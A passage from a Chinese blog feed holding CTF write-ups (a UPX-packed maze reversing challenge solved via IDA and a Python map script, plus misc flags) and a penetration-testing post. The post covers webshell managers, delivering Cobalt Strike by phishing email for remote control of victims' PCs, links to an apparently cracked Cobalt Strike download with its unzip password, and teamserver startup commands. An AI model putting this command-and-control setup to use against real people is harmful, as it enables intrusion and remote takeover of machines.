punctuation">)</span><span class="token punctuation">:</span>    s2 <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>ss<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">^</span> key<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'DASCTF&#123;'</span> <span class="token operator">+</span> s2 <span class="token operator">+</span> <span class="token string">'&#125;'</span><span class="token punctuation">)</span><span class="token comment"># DASCTF&#123;cfdc11cca823cb81c9456b67b5dd4c8d&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="end"><a href="#end" class="headerlink" title="end"></a>end</h3><p>emmm，因为我 前几天重装了系统，电脑里面没有PE检查工具，开始直接拖入ida32里面去了，但是其实加了一个UPX的壳，要先用工具脱壳再拖入ida32中。</p><p>拖入ida之后肯定是要先看看start函数了，但是没啥发现，直接shift+f12搜索字符串发现flag的痕迹，一路追过去发现关键代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">sub_40238F</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v1<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">int</span> v4<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+18h] [ebp-47Ch] BYREF</span>  <span class="token keyword">char</span> Buffer<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+71h] [ebp-423h] BYREF</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+84h] [ebp-410h] BYREF</span>  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [esp+94h] [ebp-400h] BYREF</span>  <span class="token keyword">int</span> v8<span class="token punctuation">[</span><span class="token number">250</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+98h] [ebp-3FCh] BYREF</span>  <span class="token keyword">int</span> v9<span class="token punctuation">;</span> <span class="token comment">// [esp+480h] [ebp-14h]</span>  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [esp+484h] [ebp-10h]</span>  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [esp+488h] [ebp-Ch]</span>  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [esp+48Ch] [ebp-8h]</span>  <span class="token function">sub_402B50</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  v11 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v8<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v9 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please input:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>      v0 <span class="token operator">=</span> i<span class="token operator">++</span><span class="token punctuation">;</span>      v8<span class="token punctuation">[</span>v0<span class="token punctuation">]</span> <span class="token operator">=</span> v7<span class="token punctuation">;</span>      <span class="token keyword">switch</span> <span class="token punctuation">(</span> v7 <span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>        <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>          v11 <span class="token operator">+=</span> <span class="token number">7</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">8</span><span class="token operator">:</span>          v11 <span class="token operator">-=</span> <span class="token number">7</span><span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">6</span><span class="token operator">:</span>          <span class="token operator">++</span>v11<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">case</span> <span class="token number">4</span><span class="token operator">:</span>          <span class="token operator">--</span>v11<span class="token punctuation">;</span>          <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token keyword">default</span><span class="token operator">:</span>          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token punctuation">)</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>        <span class="token keyword">break</span><span class="token punctuation">;</span>      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"continue"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> dword_406060<span class="token punctuation">[</span>v11<span class="token punctuation">]</span> <span class="token operator">!=</span> <span class="token number">35</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v8<span class="token punctuation">[</span>v9<span class="token punctuation">]</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v1 <span class="token operator">=</span> v9<span class="token operator">++</span><span class="token punctuation">;</span>    v10 <span class="token operator">+=</span> v8<span class="token punctuation">[</span>v1<span class="token punctuation">]</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token function">sprintf</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">,</span> <span class="token string">"%d"</span><span class="token punctuation">,</span> v10<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_401410</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  v2 <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>Buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_401451</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">,</span> Buffer<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">sub_401582</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"congratulation"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"the flag is &#123;"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">15</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> __int8<span class="token punctuation">)</span>v6<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据题目提示”走啊走啊”可以猜测这是一道迷宫题。迷宫的地图为</p><pre class="line-numbers language-data" data-language="data"><code class="language-data">.data:00406064                 db    0.data:00406065                 db    0.data:00406066                 db    0.data:00406067                 db    0.data:00406068                 db    0.data:00406069                 db    0.data:0040606A                 db    0.data:0040606B                 db    0.data:0040606C                 db    0.data:0040606D                 db    0.data:0040606E                 db    0.data:0040606F                 db    0.data:00406070                 db    0.data:00406071                 db    0.data:00406072                 db    0.data:00406073                 db    0.data:00406074                 db    0.data:00406075                 db    0.data:00406076                 db    0.data:00406077                 db    0.data:00406078                 db    0.data:00406079                 db    0.data:0040607A                 db    0.data:0040607B                 db    0.data:0040607C                 db    1.data:0040607D                 db    0.data:0040607E                 db    0.data:0040607F                 db    0.data:00406080                 db    1.data:00406081                 db    0.data:00406082                 db    0.data:00406083                 db    0.data:00406084                 db    0.data:00406085                 db    0.data:00406086                 db    0.data:00406087                 db    0.data:00406088                 db    0.data:00406089                 db    0.data:0040608A                 db    0.data:0040608B                 db    0.data:0040608C                 db    0.data:0040608D                 db    0.data:0040608E                 db    0.data:0040608F                 db    0.data:00406090                 db    0.data:00406091                 db    0.data:00406092                 db    0.data:00406093                 db    0.data:00406094                 db    0.data:00406095                 db    0.data:00406096                 db    0.data:00406097                 db    0.data:00406098                 db    0.data:00406099                 db    0.data:0040609A                 db    0.data:0040609B                 db    0.data:0040609C                 db    1.data:0040609D                 db    0.data:0040609E                 db    0.data:0040609F                 db    0.data:004060A0                 db    0.data:004060A1                 db    0.data:004060A2                 db    0.data:004060A3                 db    0.data:004060A4                 db    1.data:004060A5                 db    0.data:004060A6                 db    0.data:004060A7                 db    0.data:004060A8                 db    1.data:004060A9                 db    0.data:004060AA                 db    0.data:004060AB                 db    0.data:004060AC                 db    1.data:004060AD                 db    0.data:004060AE                 db    0.data:004060AF                 db    0.data:004060B0                 db    0.data:004060B1                 db    0.data:004060B2                 db    0.data:004060B3                 db    0.data:004060B4                 db    0.data:004060B5                 db    0.data:004060B6                 db    0.data:004060B7                 db    0.data:004060B8                 db    1.data:004060B9                 db    0.data:004060BA                 db    0.data:004060BB                 db    0.data:004060BC                 db    1.data:004060BD                 db    0.data:004060BE                 db    0.data:004060BF                 db    0.data:004060C0                 db    1.data:004060C1                 db    0.data:004060C2                 db    0.data:004060C3                 db    0.data:004060C4                 db    0.data:004060C5                 db    0.data:004060C6                 db    0.data:004060C7                 db    0.data:004060C8                 db    1.data:004060C9                 db    0.data:004060CA                 db    0.data:004060CB                 db    0.data:004060CC                 db    0.data:004060CD                 db    0.data:004060CE                 db    0.data:004060CF                 db    0.data:004060D0                 db    0.data:004060D1                 db    0.data:004060D2                 db    0.data:004060D3                 db    0.data:004060D4                 db    0.data:004060D5                 db    0.data:004060D6                 db    0.data:004060D7                 db    0.data:004060D8                 db    0.data:004060D9                 db    0.data:004060DA                 db    0.data:004060DB                 db    0.data:004060DC                 db    0.data:004060DD                 db    0.data:004060DE                 db    0.data:004060DF                 db    0.data:004060E0                 db    0.data:004060E1                 db    0.data:004060E2                 db    0.data:004060E3                 db    0.data:004060E4                 db    1.data:004060E5                 db    0.data:004060E6                 db    0.data:004060E7                 db    0.data:004060E8                 db    0.data:004060E9                 db    0.data:004060EA                 db    0.data:004060EB                 db    0.data:004060EC                 db    1.data:004060ED                 db    0.data:004060EE                 db    0.data:004060EF                 db    0.data:004060F0                 db    0.data:004060F1                 db    0.data:004060F2                 db    0.data:004060F3                 db    0.data:004060F4                 db    0.data:004060F5                 db    0.data:004060F6                 db    0.data:004060F7                 db    0.data:004060F8                 db    1.data:004060F9                 db    0.data:004060FA                 db    0.data:004060FB                 db    0.data:004060FC                 db    1.data:004060FD                 db    0.data:004060FE                 db    0.data:004060FF                 db    0.data:00406100                 db    1.data:00406101                 db    0.data:00406102                 db    0.data:00406103                 db    0.data:00406104                 db    0.data:00406105                 db    0.data:00406106                 db    0.data:00406107                 db    0.data:00406108                 db    1.data:00406109                 db    0.data:0040610A                 db    0.data:0040610B                 db    0.data:0040610C                 db    0.data:0040610D                 db    0.data:0040610E                 db    0.data:0040610F                 db    0.data:00406110                 db    0.data:00406111                 db    0.data:00406112                 db    0.data:00406113                 db    0.data:00406114                 db    1.data:00406115                 db    0.data:00406116                 db    0.data:00406117                 db    0.data:00406118                 db    0.data:00406119                 db    0.data:0040611A                 db    0.data:0040611B                 db    0.data:0040611C                 db    0.data:0040611D                 db    0.data:0040611E                 db    0.data:0040611F                 db    0.data:00406120                 db    0.data:00406121                 db    0.data:00406122                 db    0.data:00406123                 db    0.data:00406124                 db    0.data:00406125                 db    0.data:00406126                 db    0.data:00406127                 db    0.data:00406128                 db    0.data:00406129                 db    0.data:0040612A                 db    0.data:0040612B                 db    0.data:0040612C                 db    0.data:0040612D                 db    0.data:0040612E                 db    0.data:0040612F                 db    0.data:00406130                 db    1.data:00406131                 db    0.data:00406132                 db    0.data:00406133                 db    0.data:00406134                 db    1.data:00406135                 db    0.data:00406136                 db    0.data:00406137                 db    0.data:00406138                 db    1.data:00406139                 db    0.data:0040613A                 db    0.data:0040613B                 db    0.data:0040613C                 db    35<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>把上面的数据保存成<code>migong.txt</code>，然后用下面的脚本还原出迷宫</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'migong.txt'</span><span class="token punctuation">,</span> <span class="token string">'rb'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span>    data <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span>    res <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> <span class="token punctuation">(</span>i <span class="token operator">%</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            res <span class="token operator">+=</span> <span class="token string">'\n'</span>        res <span class="token operator">+=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>data<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>ress <span class="token operator">=</span> res<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token keyword">print</span><span class="token punctuation">(</span>ress<span class="token punctuation">)</span>res2 <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> ress<span class="token punctuation">:</span>    <span class="token keyword">if</span> <span class="token string">'1'</span> <span class="token keyword">in</span> i<span class="token punctuation">:</span>        res2 <span class="token operator">+=</span> <span class="token string">'X'</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        res2 <span class="token operator">+=</span> <span class="token string">'O'</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>res2<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>res2<span class="token punctuation">[</span>i<span class="token punctuation">:</span>i<span class="token operator">+</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>所以这道题中的迷宫就是下面的这样，至于为什么要把四个比特位似的东西合成一个比特位俺也不知道，回头等比赛结束看看带师傅的博客学习学习。</p><pre class="line-numbers language-migong" data-language="migong"><code class="language-migong">XOOOOOXXOOOOOOXOXXXOOXXXOXOOOOOOXOXOOXXXOXOOXOOOOOOXXX2622668662224422666<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后把exe文件拖入OD中依次输入上面的数字最后弹出flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210529190326303.png" alt="动态调试"></p><p><code>DASCTF&#123;f033ab37c30201f73f142449d037028d&#125;</code></p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="RelatedMessage"><a href="#RelatedMessage" class="headerlink" title="RelatedMessage"></a>RelatedMessage</h3><p><strong>泻药，好像是椭圆曲线+rsa？不会没做。</strong></p><h1 id="baby杯-CTFshow六一儿童节特辑"><a href="#baby杯-CTFshow六一儿童节特辑" class="headerlink" title="baby杯(CTFshow六一儿童节特辑)"></a>baby杯(CTFshow六一儿童节特辑)</h1><h2 id="MISC-2"><a href="#MISC-2" class="headerlink" title="MISC"></a>MISC</h2><h3 id="五子棋"><a href="#五子棋" class="headerlink" title="五子棋"></a>五子棋</h3><p>本来都不知道怎么打的，群友们一提示说是开两个人机，让他们互打，最后总有一个会赢，打了三分钟左右成功获得flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602204305469.png" alt="确实不难ao"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;Wu_J1n_5h0u_H31_X14n_B1_5h3ng@wld13qr0&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="美丽的小姐姐"><a href="#美丽的小姐姐" class="headerlink" title="美丽的小姐姐"></a>美丽的小姐姐</h3><p>简单的高度隐写，直接修改高度即可获得flag</p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602211959461.png" alt="开始时是01B8，改成02B8即可把高度变高"></p><p><img src="/2021/05/29/2021%E5%B9%B4%E5%90%84%E6%AF%94%E8%B5%9Bwp/image-20210602212100552.png" alt="image-20210602212100552"></p><pre class="line-numbers language-none"><code class="language-none">flag&#123;BF9FE48F92A9AB8948F5E266E7CE8EB4&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="babyLSB"><a href="#babyLSB" class="headerlink" title="babyLSB"></a>babyLSB</h3>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试</title>
      <link href="2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
      <url>2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h1><h2 id="冰蝎Shell管理工具"><a href="#冰蝎Shell管理工具" class="headerlink" title="冰蝎Shell管理工具"></a>冰蝎Shell管理工具</h2><h3 id="引用内容，与冰蝎的基本使用和原理"><a href="#引用内容，与冰蝎的基本使用和原理" class="headerlink" title="引用内容，与冰蝎的基本使用和原理"></a>引用内容，与冰蝎的基本使用和原理</h3><p><a href="https://www.anquanke.com/post/id/212271">冰蝎，从入门到魔改</a></p><p><a href="https://github.com/rebeyond/Behinder">官方给出的ReadMe文档</a></p><h3 id="使用方式，与冰蝎的优势和特征"><a href="#使用方式，与冰蝎的优势和特征" class="headerlink" title="使用方式，与冰蝎的优势和特征"></a>使用方式，与冰蝎的优势和特征</h3><p>因为从前的”菜刀”的流量很容易被各种工具检测到，才有了这个第二代的Shell管理工具，冰蝎是基于流量加密的Shell管理软件。冰蝎是基于Java的，所以可以跨平台使用。</p><p><strong>主要功能为：基本信息、命令执行、虚拟终端、文件管理、Socks代理、反弹shell、数据库管理、自定义代码等</strong></p><p><a href="https://github.com/rebeyond/Behinder/releases">下载GitHub上冰蝎的Release版本</a></p><p>不过需要Jre的版本为1.6-1.8似乎是，我直接运行不了，就主要使用蚁剑来进行Shell管理了。</p><h2 id="蚁剑Shell管理工具"><a href="#蚁剑Shell管理工具" class="headerlink" title="蚁剑Shell管理工具"></a>蚁剑Shell管理工具</h2><p><a href="https://xz.aliyun.com/t/4000">从静态到动态打造一款免杀的antSword(蚁剑)</a></p><p>蚁剑主要使用的是编解码流量内容来进行绕过WAF，只能说与冰蝎各有千秋吧感觉，不好说谁好谁坏。</p><h2 id="哥斯拉Shell管理工具"><a href="#哥斯拉Shell管理工具" class="headerlink" title="哥斯拉Shell管理工具"></a>哥斯拉Shell管理工具</h2><p><a href="https://github.com/BeichenDream/Godzilla/releases/tag/v3.03-godzilla">工具的下载地址</a></p><p>这个听说和冰蝎差不多，emmm，还没用过，用过之后再回来评价。</p><h2 id="Cobalt-Strike的安装与使用总结"><a href="#Cobalt-Strike的安装与使用总结" class="headerlink" title="Cobalt Strike的安装与使用总结"></a>Cobalt Strike的安装与使用总结</h2><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>Cobalt Strike也是一个木马后门的管理工具，但是这个木马管理工具相对于前面所说的几个网马工具功能多了很多了，很酷嘿嘿（众所周知，界面越炫酷，对系统所造成危害也就越大 ::doge:: ）。</p><p>所使用的方法一般就是钓鱼了，直接向被攻击者的邮箱发送一个具有诱惑性的邮件(根据被攻击者的喜好)，被攻击者点击木马之后木马上线成功，攻击者即可远程监控与控制被攻击者的PC。</p><p>但是，CS最重要的还是免杀，不能还没点呢，刚下载下来就被检测出自己的后门属性了，直接被杀还有什么后渗透可言。但是这方面的免杀还是要看二进制能力了，这不是我们主要研究的目标了，我们现在这里只需要了解CS马的简单使用即可。</p><p><a href="https://troyess.com/2021/05/23/%E5%88%9D%E8%AF%86CobaltStrike/">参考徐神的文章，徐神我的超人</a></p><h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><p><a href="https://www.ddosi.com/cobalt-strike-4-3-fix/">CS4.3的可以下载的地址(徐神强推的一个网站)</a></p><p><a href="https://anonfiles.com/bdQ7Ldtau3/cobaltstrike4.3_www.ddosi.com_rar">国外某网盘的下载链接(内容取自上面的那个网站)</a></p><p>解压密码为:<code>www.ddosi.com</code></p><pre class="line-numbers language-none"><code class="language-none">Linux下启动该工具.&#x2F;start.shsh文件里面的命令为java -XX:ParallelGCThreads&#x3D;4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar $*Windows下启动该工具直接点击 可执行文件exe即可。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="配置安装"><a href="#配置安装" class="headerlink" title="配置安装"></a>配置安装</h3><p>在自己服务器配置服务端，CS的整体架构应该像下面这样吧？</p><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603131230506.png" alt="image-20210603131230506"></p><p>英格力士高级不高级，嘿嘿。</p><h4 id="安装JDK1-8-0"><a href="#安装JDK1-8-0" class="headerlink" title="安装JDK1.8.0"></a>安装JDK1.8.0</h4><p>先配置部署在云服务器的总服务端吧，首先安装JDK1.8，这里只展示centos安装的jdk1.8，其他的也都挺类似的。网上教程很详细。</p><pre class="line-numbers language-none"><code class="language-none">用yum安装JDK1.查看yum库中都有哪些jdk版本(暂时只发现了openjdk)[root@localhost ~]# yum search java|grep jdkldapjdk-javadoc.x86_64 : Javadoc for ldapjdkjava-1.6.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.6.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.6.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.6.0-openjdk-javadoc.x86_64 : OpenJDK API Documentationjava-1.6.0-openjdk-src.x86_64 : OpenJDK Source Bundlejava-1.7.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.7.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.7.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.7.0-openjdk-javadoc.noarch : OpenJDK API Documentationjava-1.7.0-openjdk-src.x86_64 : OpenJDK Source Bundlejava-1.8.0-openjdk.x86_64 : OpenJDK Runtime Environmentjava-1.8.0-openjdk-demo.x86_64 : OpenJDK Demosjava-1.8.0-openjdk-devel.x86_64 : OpenJDK Development Environmentjava-1.8.0-openjdk-headless.x86_64 : OpenJDK Runtime Environmentjava-1.8.0-openjdk-javadoc.noarch : OpenJDK API Documentationjava-1.8.0-openjdk-src.x86_64 : OpenJDK Source Bundleldapjdk.x86_64 : The Mozilla LDAP Java SDK2.选择版本,进行安装&#x2F;&#x2F;选择1.7版本进行安装[root@localhost ~]# yum install java-1.8.0-openjdk&#x2F;&#x2F;安装完之后，默认的安装目录是在: &#x2F;usr&#x2F;lib&#x2F;jvm&#x2F;3.查看java版本[root@VM-12-8-centos ~]# java -versionopenjdk version &quot;1.8.0_292&quot;OpenJDK Runtime Environment (build 1.8.0_292-b10)OpenJDK 64-Bit Server VM (build 25.292-b10, mixed mode)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="运行teamserver总服务端"><a href="#运行teamserver总服务端" class="headerlink" title="运行teamserver总服务端"></a>运行teamserver总服务端</h4><pre class="line-numbers language-none"><code class="language-none">运行的方式如下chmod +x teamserver.&#x2F;teamserver vps的ip地址 连接口令<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2021/05/28/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/image-20210603135728701.png" 